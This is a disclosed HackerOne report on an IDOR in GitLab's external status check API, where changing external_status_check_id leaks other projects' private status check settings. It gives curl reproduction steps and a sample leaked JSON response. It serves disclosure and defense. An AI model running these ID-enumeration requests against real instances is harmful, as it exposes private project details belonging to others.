# IDOR in "external status check" API leaks data about any status check on the instance

## Report Details
- **Report ID**: 1372216
- **URL**: https://hackerone.com/reports/1372216
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-10-16T20:22:06.303Z
- **Disclosed**: 2022-02-22T19:48:17.868Z

## Reporter
- **Username**: joaxcar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

The API endpoint for returning approval from an `external status check` contains an IDOR that lets a user list information about all `external status checks` on the GitLab instance. The feature is an `Ultimate` feature, but can be accessed by starting an `Ultimate` trial on GitLab.com. So the attack is possible with a regular account.

When an `external status check` is configured, the project will send out information about MRs to a specified endpoint. This endpoint can then be configured to answer to the request to "pass" the status check. Description of the feature [here](https://docs.gitlab.com/ee/user/project/merge_requests/status_checks.html). The API endpoint for this answer is ([info](https://docs.gitlab.com/ee/api/status_checks.html#set-status-of-an-external-status-check))
```
POST /projects/:id/merge_requests/:merge_request_iid/status_check_responses
```
with the passed in parameters `sha` and `external_status_check_id`. It is the later one that contains the IDOR. This parameter tells GitLab which `external status check` the request is targeting. And the answer back from GitLab is JSON containing info about the MR but also info about the status check configuration. By altering the ID sent, a user can obtain info about any status check on the instance (even from Private projects).

Leaked information about a status check could look like the example below and could contain:

* Private project name and ID
* Name of status check
* Private address to external status check tool
* Name and ID of protected branch connected to the status check
* Access rules to protected branch, if configured also name of user that is allowed to access

```
"external_status_check": {
    "id": 10,
    "name": "Name of status check",
    "project_id": 33,
    "external_url": "https://victim.service.com",
    "protected_branches": [
      {
        "id": 24,
        "name": "Name of protected branch",
        "push_access_levels": [
          {
            "access_level": 40,
            "access_level_description": "Name of user with access to protected branch",
            "user_id": 2,
            "group_id": null
          },
          {
            "access_level": 30,
            "access_level_description": "Developers + Maintainers",
            "user_id": null,
            "group_id": null
          }
        ],
        "merge_access_levels": [
          {
            "access_level": 30,
            "access_level_description": "Developers + Maintainers",
            "user_id": null,
            "group_id": null
          },
          {
            "access_level": 40,
            "access_level_description": "Name of user with access",
            "user_id": 2,
            "group_id": null
          }
        ],
        "allow_force_push": true,
        "unprotect_access_levels": [],
        "code_owner_approval_required": true
      }
```

### Steps to reproduce

1. Create two users `victim01` and `attacker01`
2. Log in as `victim01` and create a new PRIVATE project called `victim_project` at https://gitlab.domain.com/projects/new#blank_project
3. Go to go to project settings https://gitlab.domain.com/victim01/victim_project/edit and expand "Merge request" under "General". Scroll down to "Status checks" and click create new.
4. Name the status check "Victim status check" and enter a API endpoint "https://victim.hidden.com"
5. Click save
6. Log out and log back in as `attacker01`
7. Go through step 2 to 5 again but name the project `attacker_project` and the status check anything. Take a note of the ID of the project. We will call it `attackID`
8. Now create a new branch in `attacker_project` at https://gitlab.domain.com/attacker01/attacker_project/-/branches/new
9. Click "Create new merge request" when the branch is created. Name the MR anything and click create
10. Go to https://gitlab.domain.com/-/profile/personal_access_tokens and create an access token for `attacker01`, we will call it `TOKEN`
11. Open a terminal and make this request (the SHA is just "a" here, we will get the correct one as a response)
```
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=a&external_status_check_id=2' \
  --header 'Authorization: Bearer <TOKEN>'
```
12. This iniitial request will return an error saying `the correct sha is <SHA>`
13. Now send with correct SHA
```
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&external_status_check_id=2' \
  --header 'Authorization: Bearer <TOKEN>'
```
14. We will get a response with info about the MR and in the end info about the `status check`
15. Now send the same request again but change status check id to 1
```
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&external_status_check_id=1' \
  --header 'Authorization: Bearer <TOKEN>'
```
16. The same MR info is returned, but in the end there will be info about the private status check from `victim_project`


### Impact

An attacker can leak information about any `external status check` on the instance. This data contains sensitive private information.

### What is the current *bug* behavior?

The parameter `external_status_check_id` is not restricted to the status checks configured in the project.

### What is the expected *correct* behavior?

The parameter should only allow IDs that corresponds to status checks in the target project.

### Output of checks

This bug happens on GitLab.com

## Impact

Leaked information about a status check could look like the example below and could contain:

* Private project name and ID
* Name of status check
* Private address to external status check tool
* Name and ID of protected branch connected to the status check
* Access rules to protected branch, if configured also name of user that is allowed to access

## Attachments
No attachments
